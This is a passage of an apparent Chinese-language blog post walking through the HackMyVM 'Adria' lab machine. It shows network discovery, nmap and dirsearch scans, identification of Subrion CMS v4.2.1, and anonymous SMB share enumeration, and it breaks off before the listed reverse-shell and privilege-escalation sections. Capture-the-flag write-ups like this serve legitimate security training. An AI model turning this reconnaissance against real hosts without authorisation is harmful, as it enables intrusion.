@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HMV Adria - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/hmv_adria/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="HMV Adria">
+  <meta property="og:description" content="HMV Adria 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Adria
+日常扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.102 08:00:27:96:ce:01 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.864 seconds (137.34 hosts/sec). 3 responded ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.102 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 22:21 HKT Nmap scan report for 192.168.31.102 Host is up (0.0014s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0) | ssh-hostkey: | 256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA) |_ 256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: Did not follow redirect to http://adria.hmv/ | http-robots.txt: 7 disallowed entries | /backup/ /cron/? /front/ /install/ /panel/ /tmp/ |_/updates/ |_http-server-header: Apache/2.4.57 (Debian) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 MAC Address: 08:00:27:96:CE:01 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 我说直接curl80没有东西，他有个重定向，写入到/etc/hosts，然后访问就行了">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-25T20:04:36+08:00">
+    <meta property="article:modified_time" content="2025-02-25T20:04:36+08:00">
+    <meta property="article:tag" content="渗透">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="HMV Adria">
+  <meta name="twitter:description" content="HMV Adria 靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Adria
+日常扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.102 08:00:27:96:ce:01 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.864 seconds (137.34 hosts/sec). 3 responded ┌──(kali㉿kali)-[~] └─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.102 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 22:21 HKT Nmap scan report for 192.168.31.102 Host is up (0.0014s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0) | ssh-hostkey: | 256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA) |_ 256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: Did not follow redirect to http://adria.hmv/ | http-robots.txt: 7 disallowed entries | /backup/ /cron/? /front/ /install/ /panel/ /tmp/ |_/updates/ |_http-server-header: Apache/2.4.57 (Debian) 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 MAC Address: 08:00:27:96:CE:01 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 我说直接curl80没有东西，他有个重定向，写入到/etc/hosts，然后访问就行了">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/hmv_adria/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/hkcert2024/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/hugo%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%B8%BB%E9%A2%98%E5%AE%8C%E5%96%84/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HMV Adria",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/hmv_adria\/"
+        },"genre": "posts","keywords": "渗透","wordcount":  1585 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/hmv_adria\/","datePublished": "2025-02-25T20:04:36+08:00","dateModified": "2025-02-25T20:04:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HMV Adria</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>靶场</a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-02-25">2025-02-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1585 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;<span id="/hmv_adria/" class="leancloud_visitors" data-flag-title="HMV Adria">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#hmv-adria">HMV Adria</a>
+      <ul>
+        <li><a href="#靶场链接">靶场链接</a></li>
+        <li><a href="#日常扫描">日常扫描</a></li>
+        <li><a href="#反弹shell">反弹shell</a></li>
+        <li><a href="#提权">提权</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="hmv-adria">HMV Adria</h2>
+<h3 id="靶场链接">靶场链接</h3>
+<p><a href="https://hackmyvm.eu/machines/machine.php?vm=Adria" target="_blank" rel="noopener noreffer ">https://hackmyvm.eu/machines/machine.php?vm=Adria</a></p>
+<h3 id="日常扫描">日常扫描</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ sudo arp-scan -l
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+</span></span><span class="line"><span class="cl">192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
+</span></span><span class="line"><span class="cl">192.168.31.102  08:00:27:96:ce:01       (Unknown)
+</span></span><span class="line"><span class="cl">192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3 packets received by filter, 0 packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: 256 hosts scanned in 1.864 seconds (137.34 hosts/sec). 3 responded
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.102
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 22:21 HKT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.31.102
+</span></span><span class="line"><span class="cl">Host is up (0.0014s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65531 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://adria.hmv/
+</span></span><span class="line"><span class="cl">| http-robots.txt: 7 disallowed entries 
+</span></span><span class="line"><span class="cl">| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
+</span></span><span class="line"><span class="cl">|_/updates/
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.57 (Debian)
+</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn Samba smbd 4.6.2
+</span></span><span class="line"><span class="cl">445/tcp open  netbios-ssn Samba smbd 4.6.2
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:96:CE:01 (Oracle VirtualBox virtual NIC)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我说直接curl80没有东西，他有个重定向，写入到/etc/hosts，然后访问就行了</p>
+<p>扫一下目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">dirsearch</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.102</span> <span class="o">-</span><span class="n">i</span> <span class="mi">200</span><span class="p">,</span><span class="mi">301</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">dirsearch</span><span class="o">/</span><span class="n">dirsearch</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span> <span class="n">DeprecationWarning</span><span class="p">:</span> <span class="n">pkg_resources</span> <span class="n">is</span> <span class="n">deprecated</span> <span class="n">as</span> <span class="n">an</span> <span class="n">API</span><span class="o">.</span> <span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">setuptools</span><span class="o">.</span><span class="n">pypa</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">en</span><span class="o">/</span><span class="n">latest</span><span class="o">/</span><span class="n">pkg_resources</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">  <span class="n">from</span> <span class="n">pkg_resources</span> <span class="n">import</span> <span class="n">DistributionNotFound</span><span class="p">,</span> <span class="n">VersionConflict</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">_</span><span class="o">|.</span> <span class="n">_</span> <span class="n">_</span>  <span class="n">_</span>  <span class="n">_</span>  <span class="n">_</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span>    <span class="n">v0</span><span class="o">.</span><span class="mf">4.3</span>                                                
+</span></span><span class="line"><span class="cl"> <span class="p">(</span><span class="n">_</span><span class="o">|||</span> <span class="n">_</span><span class="p">)</span> <span class="p">(</span><span class="o">/</span><span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="o">||</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="p">)</span>                                                         
+</span></span><span class="line"><span class="cl">                                                                                
+</span></span><span class="line"><span class="cl"><span class="n">Extensions</span><span class="p">:</span> <span class="n">php</span><span class="p">,</span> <span class="n">aspx</span><span class="p">,</span> <span class="n">jsp</span><span class="p">,</span> <span class="n">html</span><span class="p">,</span> <span class="n">js</span> <span class="o">|</span> <span class="n">HTTP</span> <span class="n">method</span><span class="p">:</span> <span class="n">GET</span> <span class="o">|</span> <span class="n">Threads</span><span class="p">:</span> <span class="mi">25</span>
+</span></span><span class="line"><span class="cl"><span class="n">Wordlist</span> <span class="n">size</span><span class="p">:</span> <span class="mi">11460</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Output</span> <span class="ne">File</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">reports</span><span class="o">/</span><span class="n">http_192</span><span class="o">.</span><span class="mf">168.31</span><span class="o">.</span><span class="mi">102</span><span class="o">/</span><span class="n">_25</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">24</span><span class="n">_22</span><span class="o">-</span><span class="mi">30</span><span class="o">-</span><span class="mf">28.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Target</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.102</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">28</span><span class="p">]</span> <span class="n">Starting</span><span class="p">:</span>                                                            
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>  <span class="mi">247</span><span class="n">B</span>  <span class="o">-</span> <span class="o">/.</span><span class="n">gitignore</span>                                       
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">41</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>   <span class="mi">15</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">changelog</span><span class="o">.</span><span class="n">txt</span>                                    
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>    <span class="mi">4</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">CONTRIBUTING</span><span class="o">.</span><span class="n">md</span>                                  
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>  <span class="mi">851</span><span class="n">B</span>  <span class="o">-</span> <span class="o">/</span><span class="n">favicon</span><span class="o">.</span><span class="n">ico</span>                                      
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>   <span class="mi">12</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">license</span><span class="o">.</span><span class="n">txt</span>                                      
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">29</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>    <span class="mi">1</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">panel</span><span class="o">.</span><span class="n">php</span>                                        
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">29</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>    <span class="mi">1</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">panel</span><span class="o">.</span><span class="n">aspx</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>    <span class="mi">1</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">panel</span><span class="o">.</span><span class="n">jsp</span>                                        
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>    <span class="mi">1</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">panel</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">30</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>    <span class="mi">1</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">panel</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>    <span class="mi">5</span><span class="n">KB</span> <span class="o">-</span> <span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span>                                        
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>   <span class="mi">94</span><span class="n">B</span>  <span class="o">-</span> <span class="o">/</span><span class="n">robots</span><span class="o">.</span><span class="n">txt</span>                                       
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="mi">200</span> <span class="o">-</span>  <span class="mi">212</span><span class="n">B</span>  <span class="o">-</span> <span class="o">/</span><span class="n">sitemap</span><span class="o">.</span><span class="n">xml</span>                                      
+</span></span><span class="line"><span class="cl">                                                                             
+</span></span><span class="line"><span class="cl"><span class="n">Task</span> <span class="n">Completed</span>     
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>/panel.php是后台页面，最有用的信息&quot; Powered by Subrion CMS v4.2.1&quot;</p>
+<h3 id="反弹shell">反弹shell</h3>
+<p>smb启动看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ smbclient -L //192.168.31.102 -N   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        print$          Disk      Printer Drivers
+</span></span><span class="line"><span class="cl">        DebianShare     Disk      
+</span></span><span class="line"><span class="cl">        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
+</span></span><span class="line"><span class="cl">        nobody          Disk      Home Directories
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 for workgroup listing.
+</span></span><span class="line"><span class="cl">smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+</span></span><span class="line"><span class="cl">Protocol negotiation to server 192.168.31.102 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Desktop]
